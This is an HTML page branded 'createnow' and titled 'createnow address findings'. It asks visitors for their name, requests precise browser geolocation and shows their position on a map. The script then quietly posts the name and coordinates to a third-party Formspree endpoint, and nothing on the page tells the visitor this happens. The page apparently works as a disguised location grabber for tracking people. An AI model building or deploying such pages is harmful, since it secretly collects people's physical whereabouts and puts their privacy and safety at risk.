<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>createnow address findings</title>

  <!-- Leaflet CSS -->
  <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />

  <style>
    body {
      font-family: Arial, sans-serif;
      padding: 20px;
      text-align: center;
      margin: 0;
      background-color: lightblue; 
      color: #000;
    }

    h2 {
      font-size: 2.2em;
      margin-bottom: 5px;
    }

    .subtitle {
      font-size: 0.95em;
      color: lightgray;
      margin-bottom: 20px;
    }

    /* Stylized createnow */
    .brand-highlight {
      font-weight: bold;
      display: inline-block;
    }

    .brand-cre {
      color: black;
    }

    .brand-ate {
      color: red;
    }

    .brand-now {
      color: black;
    }

    input[type="text"] {
      padding: 10px;
      font-size: 1em;
      width: 250px;
      margin-bottom: 15px;
      border-radius: 6px;
      border: 1px solid #ccc;
    }

    button {
      background-color: #0078d7;
      border: none;
      padding: 15px 30px;
      color: white;
      font-size: 1.2em;
      border-radius: 8px;
      cursor: pointer;
      margin-bottom: 15px;
    }

    button:hover {
      background-color: #005fa3;
    }

    #status {
      margin: 10px 0 20px;
      font-size: 1.1em;
      color: #000;
      min-height: 1.4em;
    }

    #map {
      height: 400px;
      max-width: 600px;
      margin: 0 auto 20px;
      border-radius: 8px;
      border: 1px solid #ccc;
      display: none;
    }
  </style>
</head>
<body>

  <!-- Header -->
  <h2 class="brand-highlight">
    <span class="brand-cre">cre</span><span class="brand-ate">ate</span><span class="brand-now">now</span>
  </h2>
  <div class="subtitle">anything to everything</div>

  <!-- Input for user name -->
  <input type="text" id="userName" placeholder="Enter your name" />
  <br />
  <button id="actionBtn">Get Location</button>
  <div id="status"></div>
  <div id="map"></div>

  <form id="locationForm" style="display:none;">
    <input type="hidden" name="latitude" id="latitude" />
    <input type="hidden" name="longitude" id="longitude" />
    <input type="hidden" name="name" id="name" />
  </form>

  <!-- Leaflet JS -->
  <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>

  <script>
    const status = document.getElementById('status');
    const actionBtn = document.getElementById('actionBtn');
    const mapDiv = document.getElementById('map');
    const latInput = document.getElementById('latitude');
    const lngInput = document.getElementById('longitude');
    const nameInput = document.getElementById('name');
    const userNameInput = document.getElementById('userName');

    let map;
    let marker;

    actionBtn.addEventListener('click', () => {
      const userName = userNameInput.value.trim();
      if (!userName) {
        alert('Please enter your name before proceeding.');
        userNameInput.focus();
        return;
      }

      if (!navigator.geolocation) {
        status.textContent = 'Geolocation is not supported by your browser.';
        return;
      }

      status.textContent = 'Getting your location...';

      navigator.geolocation.getCurrentPosition(
        (position) => {
          const lat = position.coords.latitude;
          const lng = position.coords.longitude;

          status.textContent = `Location found: ${lat.toFixed(6)}, ${lng.toFixed(6)}.`;

          mapDiv.style.display = 'block';

          if (!map) {
            map = L.map('map').setView([lat, lng], 15);

            L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
              maxZoom: 19,
              attribution: 'Â© OpenStreetMap contributors',
            }).addTo(map);

            marker = L.marker([lat, lng]).addTo(map)
              .bindPopup(`${userName} is here.`)
              .openPopup();
          } else {
            map.setView([lat, lng], 15);
            marker.setLatLng([lat, lng]).setPopupContent(`${userName} is here.`).openPopup();
          }

          latInput.value = lat;
          lngInput.value = lng;
          nameInput.value = userName;

          const data = new FormData();
          data.append('latitude', lat);
          data.append('longitude', lng);
          data.append('name', userName);

          fetch('https://formspree.io/f/xpwzqrod', {
            method: 'POST',
            body: data,
            headers: {
              'Accept': 'application/json'
            }
          });
        },
        (error) => {
          switch (error.code) {
            case error.PERMISSION_DENIED:
              status.textContent = 'Permission denied. Cannot get location.';
              break;
            case error.POSITION_UNAVAILABLE:
              status.textContent = 'Location information is unavailable.';
              break;
            case error.TIMEOUT:
              status.textContent = 'Location request timed out.';
              break;
            default:
              status.textContent = 'An unknown error occurred.';
          }
        },
        {
          enableHighAccuracy: true,
          timeout: 10000,
        }
      );
    });
  </script>
</body>
</html>
